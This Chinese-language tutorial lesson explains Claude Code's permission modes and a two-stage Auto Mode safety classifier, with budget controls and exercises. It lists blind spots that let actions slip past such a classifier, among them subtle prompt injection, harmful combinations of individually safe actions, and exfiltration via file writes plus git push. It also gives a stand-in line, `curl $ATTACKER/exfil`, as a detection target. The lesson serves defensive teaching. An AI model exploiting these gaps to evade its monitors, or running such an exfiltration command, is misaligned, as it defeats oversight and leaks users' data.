# Claude Code 作为自主 Agent：Permission Modes 与 Auto Mode

> Claude Code 暴露七种 permission modes。"plan" 会在每个 action 前询问，"default" 只对 risky actions 询问，"acceptEdits" 会自动批准文件写入但仍确认 shell execution，"bypassPermissions" 会批准一切。Auto Mode（2026 年 3 月 24 日）用两阶段并行 safety classifier 取代逐 action approval：每个 action 都运行 single-token fast check；被标记的 actions 会启动 chain-of-thought deep review。action budgets 通过 `max_turns` 和 `max_budget_usd` 执行。Auto Mode 是以 research preview 形式发布的；Anthropic 已明确表示 classifier 本身不足以单独构成解决方案。

**类型:** Learn
**语言:** Python（stdlib，两阶段 classifier 模拟器）
**先修:** Phase 15 · 01（Long-horizon agents），Phase 15 · 09（Coding-agent landscape）
**时间:** ~45 分钟

## 要解决的问题

在你的机器上运行的自主 coding agent 是一个独立安全类别。attack surface 是 agent 能触达的一切：file system、network、credentials、clipboard、任何 browser tab、任何打开的 terminal。Bruce Schneier 等人已公开指出：computer-use agents 不是 chatbots 的“feature update”，而是一种带有新风险剖面的新工具。

Claude Code 的 permission system 是 Anthropic 的回答。它不是一个“autonomous / not autonomous”开关，而是七种 modes 构成的 capability ladder：plan → default → acceptEdits → … → bypassPermissions。每种 mode 都是在速度和逐 action 审查之间的不同取舍。Auto Mode（2026 年 3 月）增加了两阶段 classifier：对 classifier 判断为安全的 actions，它把 approval 从用户关键路径上移开；对 classifier 标记的 actions，则保留审查层。

工程问题是：这个系统能抓住什么、会漏掉什么，以及某个给定任务究竟需要哪种 mode？

## 核心概念

### 七种 permission modes

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个 action 在执行前都被审查 | 不熟悉的任务；prod-adjacent code；第一次在某个 repo 上使用 agent |
| `default` | Agent 运行 actions；对任何“risky” action 提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
| `acceptEdits` | File writes 自动批准；shell exec 和 network calls 仍会提示 | 跨许多文件的 refactoring pass |
| `acceptExec` | 在 curated allowlist 内 shell commands 自动批准；writes 自动批准 | 每个 shell command 都是 `npm test` 或类似命令的紧密 inner loops |
| `autoMode` | 两阶段 safety classifier；被标记 actions 升级到 review | constrained workspace 中的 long-horizon unattended runs |
| `yolo` | 跳过大多数 prompts；仍运行 tool allowlist / denylist | Ephemeral sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档说明“只在你愿意丢弃的 ephemeral containers 内使用” |

（以上名称匹配公开 Claude Code docs；"yolo" 是宽松中间地带的非正式简称。）

### Auto Mode 一页说明

Auto Mode（2026 年 3 月 24 日发布）是第一个把逐 action approval 委托给模型的 permission mode。结构：

1. **Stage 1 — single-token classifier。** 对每个 proposed action 运行。便宜。返回 "safe" 或 "flag"。设计目标是与主 agent loop 并行运行，这样获批 actions 不会排队等待。
2. **Stage 2 — secondary policy/safety review。** 只对被标记的 actions 运行。围绕 action、session 当前状态和声明任务做聚焦的 policy 与 safety assessment。如果 confidence 低，则升级到 user HITL。

Budget controls 与 classifier 并列：

- `max_turns` — 一个 session 中的总 iterations。
- `max_budget_usd` — abort session 的美元上限。
- 每个 tool 的 action-count limits（不超过 N 次 `WebFetch` calls 等）。

### 系统能抓住什么

- 对 tool inputs 的直接 prompt injection，其中注入指令映射到 known-risky action shape。
- 重复 tool loops：classifier 能看到 action N+1 与 action N 连续五次几乎相同。
- 在一个原本只编辑文件的 session 中，明显 out-of-scope 的 shell commands。

### 系统会漏掉什么

- **细微 prompt injection**，它调制行为但不产生单个被标记 action。Indirect prompt injection 不是一个可以完全 patch 的漏洞（OpenAI preparedness head, 2025, on browser agents，见 Lesson 11）。
- **语义层 misbehavior。** 每个单独 action 都可能看起来安全，但组合后的 trajectory 有害。classifier 判断 action；它不会重新推导用户意图。
- **通过合法渠道 exfiltration。** 把数据写入你拥有的文件，再 `git push` 到公开 repo，是一串被允许 actions；问题在于它们的组合。

### Research preview framing

Anthropic 以 research preview 发布 Auto Mode。文档明确说明 classifier 是一层，而不是解决方案：用户应该把 Auto Mode 与 budgets、allowlists、isolated workspaces、trajectory audits（Lessons 12-16）结合使用。preview framing 也反映了已记录的 evaluation-vs-deployment gap（Lesson 1）：一个通过 offline evals 的 classifier，在用户上下文模糊的真实 session 中可能表现不同。

### 这条 ladder 在你的工作流中的位置

- 不熟悉任务：从 `plan` 开始。阅读计划比回滚一次糟糕运行更便宜。
- 已知 refactor：`acceptEdits` 能省掉大量确认点击。
- 无人值守后台运行：`autoMode` 只应在你已经测量过 blast radius 的 workspace 内使用（无 credentials、无 production mounts、无你未选择开启的 egress）。
- Ephemeral containers：当且仅当 container 及其 credentials 都可丢弃时，`yolo` / `bypassPermissions` 才可接受。

## 实际使用

`code/main.py` 模拟两阶段 classifier。Stage 1 是针对 proposed actions 的廉价 keyword rule；Stage 2 是较慢的多规则 reviewer。driver 输入一条简短 synthetic trajectory（safe actions、prompt-injection attempt、repetitive loop），并展示 classifier 在哪里抓住、哪里漏掉。

## 交付成果

`outputs/skill-permission-mode-picker.md` 将一个 task description 匹配到合适 permission mode、budget caps 和必需 isolation。

## 练习

1. 运行 `code/main.py`。哪种 synthetic action type 从不被 Stage 1 标记，但总会被 Stage 2 抓住？哪种两者都抓不住？

2. 扩展 Stage 1 rule set，以捕获某个具体 known-bad shape（例如 `curl $ATTACKER/exfil`）。在 benign-action sample 上测量 false-positive rate。

3. 阅读 Anthropic 的 “How the agent loop works” doc。列出 agent 在 `default` mode 下默认触碰的每种 external state。在无人值守运行 `autoMode` 前，你需要分别 gate 哪些？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、per-tool caps、allowlists。说明每个数字的理由。

5. 描述一条 trajectory：其中每个单独 action 都被 Stage 1 和 Stage 2 批准，但组合后的行为是 misaligned。（Lesson 14 会覆盖 kill switches 和 canary tokens 如何处理这个问题。）

## 关键术语

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | “agent 能做多少事” | 控制逐 action approval 的七种 named policies 之一 |
| plan mode | “任何事前都询问” | Agent 写计划；用户批准后再执行 |
| acceptEdits | “让它写文件” | File writes 自动批准；shell exec 仍提示 |
| autoMode | “自动 approvals” | 两阶段 safety classifier；被标记 actions 升级 |
| bypassPermissions | “Full YOLO” | 批准一切； intended for ephemeral containers |
| Stage 1 classifier | “Fast token check” | 对 proposed action 的 single-token rule；并行运行 |
| Stage 2 classifier | “Deep review” | 对被标记 actions 做 chain-of-thought reasoning |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能的 framing |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — permission modes、budgets、action format。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service execution model。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature surface 和 Auto Mode announcement。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造 classifier judgments 的 reason-based layer。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — long-horizon permission design 的内部视角。
